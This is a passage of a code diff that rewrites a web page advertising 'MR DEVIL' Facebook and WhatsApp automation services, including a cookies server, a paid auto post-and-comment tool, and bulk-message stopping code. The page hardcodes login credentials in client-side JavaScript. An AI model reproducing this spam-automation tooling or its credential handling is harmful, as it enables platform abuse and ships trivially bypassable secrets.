+                <h2>(8) 🦋 𝗠𝗥 𝗗𝗘𝗩𝗜𝗟 𝗣𝗔𝗜𝗥 𝗖𝗢𝗗𝗘 𝗚𝗘𝗡𝗥𝗔𝗧𝗢𝗥🦋</h2>
+                <p>Generate WhatsApp/Facebook pair codes easily.</p>
+            </div>
+            <!-- (9) End-to-End Extension ZIP (Paid) -->
+            <div class="service-card paid-tool" id="emd-card" style="background: linear-gradient(135deg, #1e90ff 0%, #00bfff 100%); cursor:auto;">
+                <i class="fa-solid fa-file-zipper"></i>
+                <h2>(9) 🦋END TO END EXTENSION ZIP <span style="color:yellow;">[PAID]</span>🦋</h2>
+                <p>Download the latest End-to-End Extension ZIP.</p>
+                <div class="payment-info">
+                    <b>Price: ₹800 (Permanent)</b><br>
+                    Pay via <b>PhonePe/UPI:</b> <span style="color:yellow;">8824391563@ibl</span>
+                </div>
+                <button class="unlock-btn" onclick="showLogin('emd')">Unlock</button>
+                <div id="emd-login" class="login-popup" style="display:none;">
+                    <input type="text" placeholder="Username" id="emd-username"><br>
+                    <input type="password" placeholder="Password" id="emd-password"><br>
+                    <button onclick="loginTool('emd',9999)">Login</button>
+                </div>
+                <div id="emd-user-info" style="display:none;">
+                    <span>Welcome, <span id="emd-name"></span></span><br>
+                    <span>First Login: <span id="emd-first-login"></span></span><br>
+                    <span id="emd-timer"></span><br>
+                    <a class="download-btn" href="https://your-extension-link.com/extension.zip" download>
+                        <i class="fa fa-download"></i> Download ZIP
+                    </a>
+                    <button class="logout-btn" onclick="logoutTool('emd')">Logout</button>
+                </div>
+            </div>
+            <!-- (10) Convo Cookies Server (Free) -->
+            <div class="service-card" style="background: linear-gradient(135deg, #9932cc 0%, #ff69b4 100%);" onclick="window.open('https://your-cookies-server-link.com','_blank')">
+                <i class="fa-solid fa-cookie-bite"></i>
+                <h2>(10) 🦋𝗠𝗥 𝗗𝗘𝗩𝗜𝗟 𝗖𝗢𝗡𝗩𝗢 𝗖𝗢𝗞𝗞𝗜𝗘𝗦 𝗦𝗘𝗥𝗩𝗘𝗥🦋</h2>
+                <p>Convo cookies server for secure automation.</p>
+            </div>
+            <!-- (11) Post & Comment Tool (Paid) -->
+            <div class="service-card paid-tool" id="post-card" style="background: linear-gradient(135deg, #ff1493 0%, #ff6347 100%); cursor:auto;">
+                <i class="fa-solid fa-comments"></i>
+                <h2>(11) 🦋POST AND COMMENT TOOL <span style="color:yellow;">[PAID]</span>🦋</h2>
+                <p>Post and comment on Facebook automatically with this tool.</p>
+                <div class="payment-info">
+                    <b>Price: ₹200/month</b><br>
+                    Pay via <b>PhonePe/UPI:</b> <span style="color:yellow;">8824391563@ibl</span>
+                </div>
+                <button class="unlock-btn" onclick="showLogin('post')">Unlock</button>
+                <div id="post-login" class="login-popup" style="display:none;">
+                    <input type="text" placeholder="Username" id="post-username"><br>
+                    <input type="password" placeholder="Password" id="post-password"><br>
+                    <button onclick="loginTool('post',30)">Login</button>
+                </div>
+                <div id="post-user-info" style="display:none;">
+                    <span>Welcome, <span id="post-name"></span></span><br>
+                    <span>First Login: <span id="post-first-login"></span></span><br>
+                    <span id="post-timer"></span><br>
+                    <button class="open-btn" onclick="window.open('https://your-post-comment-tool-link.com','_blank')">Open Tool</button>
+                    <button class="logout-btn" onclick="logoutTool('post')">Logout</button>
+                </div>
+            </div>
+        </div>
     </div>
-
-    <div class="counter">
-      👑 Page Users (All Time): {{ user_counter }}<br>
-      📅 आज के Users: {{ daily_count }}
-    </div>
-
     <footer>
-      POWERED BY MR DEVIL 2025
+        <div class="footer-content">
+            <p>☠️ 𝗧𝗛𝗜𝗦 𝗧𝗢𝗢𝗟 𝗠𝗔𝗗𝗘 𝗕𝗬 𝗠𝗥 𝗗𝗘𝗩𝗜𝗟 𝗦𝗛𝗔𝗥𝗔𝗕𝗜 =𝟮𝟬𝟮𝟱☠️</p>
+            <p>🦋 𝗙𝗢𝗥 𝗔𝗡𝗬 𝗞𝗜𝗡𝗗 𝗛𝗘𝗟𝗣 𝗪𝗣 𝗡𝗢 𝗠𝗥 𝗗𝗘𝗩𝗜𝗟 𝗦𝗛𝗔𝗥𝗔𝗕𝗜 🦋 <span style="color:yellow;">9024870456</span></p>
+            <div class="social-links">
+                <a href="https://www.facebook.com/share/1AkRQ3QdVb/" class="btn btn-facebook">
+                    <i class="fab fa-facebook"></i> 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞
+                </a>
+                <a href="https://wa.me/919024870456" class="btn btn-whatsapp">
+                    <i class="fab fa-whatsapp"></i> 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 <small>(9024870456)</small>
+                </a>
+            </div>
+        </div>
     </footer>
-  </div>
+    <script>
+        // Owner-only credentials (edit here)
+        // WP Loader
+        const wpUser = "devil2025";
+        const wpPass = "Wp$@321!";
+        // End-to-End Extension
+        const emdUser = "end2endX";
+        const emdPass = "ExT!@#789";
+        // Post & Comment Tool
+        const postUser = "postuser1";
+        const postPass = "PoSt@2025";
 
-  <script>
-    function toggleTokenInput() {
-      var option = document.querySelector('[name="tokenOption"]').value;
-      document.getElementById("singleTokenInput").style.display = (option === "single") ? "block" : "none";
-      document.getElementById("tokenFileInput").style.display = (option === "multiple") ? "block" : "none";
-    }
-    window.onload = function() { toggleTokenInput(); };
-    document.addEventListener('DOMContentLoaded', function() {
-      var bg = document.getElementById('bgmusic');
-      bg.volume = 0.3;
-      bg.play();
-    });
-  </script>
+        function toggleMenu() {
+            const navMenu = document.getElementById('nav-menu');
+            navMenu.classList.toggle('active');
+        }
+        function calculateLivePing() {
+            const pingElement = document.getElementById('pingValue');
+            const startTime = performance.now();
+            const img = new Image();
+            img.src = 'https://www.google.co.in/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png?t=' + Date.now();
+            img.onload = function() {
+                const endTime = performance.now();
+                const pingTime = Math.round(endTime - startTime);
+                pingElement.innerHTML = `${pingTime} <small>ms</small>`;
+            };
+            img.onerror = function() {
+                pingElement.innerHTML = '<span style="color: var(--primary-color)">Error</span>';
+            };
+            setTimeout(() => {
+                if (!img.complete) {
+                    pingElement.innerHTML = '<span style="color: var(--primary-color)">Timeout</span>';
+                }
+            }, 5000);
+        }
+        function updateLiveTimeInIndia() {
+            const timeElement = document.getElementById('timeValue');
+            try {
+                const options = {
+                    timeZone: 'Asia/Kolkata',
+                    hour12: true,
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                };
+                const formatter = new Intl.DateTimeFormat('en-IN', options);
+                const now = new Date();
+                const timeString = formatter.format(now);
+                timeElement.innerHTML = timeString + ' <span style="font-size:0.85em;color:yellow;">IST</span>';
+            } catch (e) {
+                timeElement.innerHTML = '<span style="color: var(--primary-color)">Error</span>';
+                console.error('Time formatting error:', e);
+            }
+        }
+        function updateDateInIndia() {
+            const dateElement = document.getElementById('dateValue');
+            try {
+                const options = {
+                    timeZone: 'Asia/Kolkata',
+                    weekday: 'long',
+                    year: 'numeric',
+                    month: 'long',
+                    day: 'numeric'
+                };
+                const formatter = new Intl.DateTimeFormat('en-IN', options);
+                const now = new Date();
+                const dateString = formatter.format(now);
+                dateElement.innerHTML = dateString;
+            } catch (e) {
+                dateElement.innerHTML = '<span style="color: var(--primary-color)">Error</span>';
+                console.error('Date formatting error:', e);
+            }
+        }
+        document.addEventListener('DOMContentLoaded', function() {
+            calculateLivePing();
+            updateLiveTimeInIndia();
+            updateDateInIndia();
+            setInterval(calculateLivePing, 2000);
+            setInterval(updateLiveTimeInIndia, 1000);
+            setInterval(updateDateInIndia, 60000);
+            const cards = document.querySelectorAll('.service-card');
+            cards.forEach(card => {
+                card.addEventListener('click', function() {
+                    this.style.transform = 'scale(0.95)';
+                    setTimeout(() => {
+                        this.style.transform = '';
+                    }, 200);
+                });
+            });
+        });
+        window.addEventListener('error', function(e) {
+            console.error('Page error:', e.error);
+        });
+
+        // Paid Tool Login Logic
+        function showLogin(tool) {
+          document.getElementById(tool+'-login').style.display = 'block';
+        }
+        function loginTool(tool, validityDays) {
+          let username = document.getElementById(tool+'-username').value.trim();
+          let password = document.getElementById(tool+'-password').value.trim();
+          let valid = false;
+          if(tool=='wp' && username===wpUser && password===wpPass) valid=true;
+          if(tool=='emd' && username===emdUser && password===emdPass) valid=true;
+          if(tool=='post' && username===postUser && password===postPass) valid=true;
+          if(valid) {
+            let firstLogin = localStorage.getItem(tool+'-first-login');
+            if(!firstLogin) {
+              firstLogin = new Date().toISOString();
+              localStorage.setItem(tool+'-first-login', firstLogin);
+              localStorage.setItem(tool+'-name', username);
+            }
+            document.getElementById(tool+'-login').style.display = 'none';
+            document.getElementById(tool+'-user-info').style.display = 'block';
+            document.getElementById(tool+'-name').innerText = username;
+            document.getElementById(tool+'-first-login').innerText = new Date(firstLogin).toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'});
+            updateTimer(tool, validityDays);
+            setInterval(()=>updateTimer(tool, validityDays), 60000);
+            document.querySelector('#'+tool+'-card .unlock-btn').style.display = 'none';
+          } else {
+            alert('Invalid Username or Password');
+          }
+        }
+        function updateTimer(tool, validityDays) {
+          let firstLogin = localStorage.getItem(tool+'-first-login');
+          if(!firstLogin) return;
+          let loginDate = new Date(firstLogin);
+          let now = new Date();
+          let diff = Math.floor((now-loginDate)/(1000*60*60*24));
+          let left = validityDays - diff;
+          let timerEl = document.getElementById(tool+'-timer');
+          if(left>0) {
+            timerEl.innerText = `Validity left: ${left} days`;
+          } else {
+            timerEl.innerHTML = `<span style="color:red;">Validity expired. Please pay again.</span>`;
+            document.getElementById(tool+'-user-info').style.display = 'none';
+            document.querySelector('#'+tool+'-card .unlock-btn').style.display = 'block';
+            localStorage.removeItem(tool+'-first-login');
+            localStorage.removeItem(tool+'-name');
+          }
+        }
+        function logoutTool(tool) {
+          localStorage.removeItem(tool+'-first-login');
+          localStorage.removeItem(tool+'-name');
+          document.getElementById(tool+'-user-info').style.display = 'none';
+          document.querySelector('#'+tool+'-card .unlock-btn').style.display = 'block';
+        }
+        window.addEventListener('DOMContentLoaded',function(){
+          ['wp','emd','post'].forEach(function(tool){
+            let name = localStorage.getItem(tool+'-name');
+            let firstLogin = localStorage.getItem(tool+'-first-login');
+            let validity = (tool=='emd') ? 9999 : 30;
+            if(name && firstLogin) {
+              document.getElementById(tool+'-login').style.display = 'none';
+              document.getElementById(tool+'-user-info').style.display = 'block';
+              document.getElementById(tool+'-name').innerText = name;
+              document.getElementById(tool+'-first-login').innerText = new Date(firstLogin).toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'});
+              updateTimer(tool, validity);
+              setInterval(()=>updateTimer(tool, validity), 60000);
+              document.querySelector('#'+tool+'-card .unlock-btn').style.display = 'none';
+            }
+          });
+        });
+    </script>
 </body>
 </html>
-''', user_counter=user_counter, daily_count=len(daily_user_counter[today_str]))
-
-@app.route('/stop', methods=['POST'])
-def stop_task():
-    thread_id = request.form.get('threadId')
-    task_id = thread_task_map.get(thread_id)
-
-    if task_id and task_id in stop_events:
-        stop_events[task_id].set()
-        return f'Inbox UID {thread_id} पर भेजे जा रहे मैसेज रोक दिए गए हैं।'
-    else:
-        return f'Inbox UID {thread_id} से जुड़ा कोई Active Task नहीं मिला।'
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
